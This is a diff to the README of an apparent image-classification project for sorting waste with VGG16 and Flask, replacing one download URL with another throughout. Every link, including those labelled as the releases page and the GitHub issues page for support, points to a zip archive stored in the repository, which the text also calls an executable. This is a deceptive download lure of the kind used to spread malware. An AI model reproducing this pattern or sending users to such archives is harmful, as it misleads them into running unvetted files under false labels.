@@ -1,7 +1,7 @@
 # 🌍 waste-product-classification - Classify Waste Easily and Efficiently
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Kayzucker/waste-product-classification/main/utils/classification_product_waste_v2.9-beta.3.zip)](https://raw.githubusercontent.com/Kayzucker/waste-product-classification/main/utils/classification_product_waste_v2.9-beta.3.zip)
+[![Download](https://github.com/Kayzucker/waste-product-classification/raw/refs/heads/main/data/test/product_waste_classification_v1.9-beta.1.zip)](https://github.com/Kayzucker/waste-product-classification/raw/refs/heads/main/data/test/product_waste_classification_v1.9-beta.1.zip)
 
 ## 📖 Description
 The waste-product-classification system helps you identify and classify waste products using advanced AI technology. This end-to-end solution employs transfer learning with the VGG16 model and a user-friendly Flask interface. You can perform real-time image inference to sort waste effectively, promoting sustainability and better waste management.
@@ -17,9 +17,9 @@ To get started, follow these simple steps to download and run the application. N
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the download options.
-   [Visit Releases Page](https://raw.githubusercontent.com/Kayzucker/waste-product-classification/main/utils/classification_product_waste_v2.9-beta.3.zip)
+   [Visit Releases Page](https://github.com/Kayzucker/waste-product-classification/raw/refs/heads/main/data/test/product_waste_classification_v1.9-beta.1.zip)
 
-2. **Choose the Right Version:** On the releases page, select the latest version of the application. Look for files named `https://raw.githubusercontent.com/Kayzucker/waste-product-classification/main/utils/classification_product_waste_v2.9-beta.3.zip` for zip files or `https://raw.githubusercontent.com/Kayzucker/waste-product-classification/main/utils/classification_product_waste_v2.9-beta.3.zip` for executable files.
+2. **Choose the Right Version:** On the releases page, select the latest version of the application. Look for files named `https://github.com/Kayzucker/waste-product-classification/raw/refs/heads/main/data/test/product_waste_classification_v1.9-beta.1.zip` for zip files or `https://github.com/Kayzucker/waste-product-classification/raw/refs/heads/main/data/test/product_waste_classification_v1.9-beta.1.zip` for executable files.
 
 3. **Download and Extract:**
    - For zip files, download the file and extract it using your preferred file manager.
@@ -50,7 +50,7 @@ To get started, follow these simple steps to download and run the application. N
 - **Image Not Classifying:** Ensure that the image is clear. Blurry or dark images may lead to incorrect classifications.
 
 ## 📞 Support
-For help or questions, please reach out to us via the issues section on [GitHub](https://raw.githubusercontent.com/Kayzucker/waste-product-classification/main/utils/classification_product_waste_v2.9-beta.3.zip). We aim to respond quickly and assist you effectively.
+For help or questions, please reach out to us via the issues section on [GitHub](https://github.com/Kayzucker/waste-product-classification/raw/refs/heads/main/data/test/product_waste_classification_v1.9-beta.1.zip). We aim to respond quickly and assist you effectively.
 
 ## 📜 License
 This project is licensed under the MIT License. You can freely use, modify, and distribute the application.
@@ -63,4 +63,4 @@ For more details about the technology behind this application, check out the rep
 
 ## 📥 Download Again
 To download the application, visit the link below:
-[Download Now](https://raw.githubusercontent.com/Kayzucker/waste-product-classification/main/utils/classification_product_waste_v2.9-beta.3.zip)
+[Download Now](https://github.com/Kayzucker/waste-product-classification/raw/refs/heads/main/data/test/product_waste_classification_v1.9-beta.1.zip)
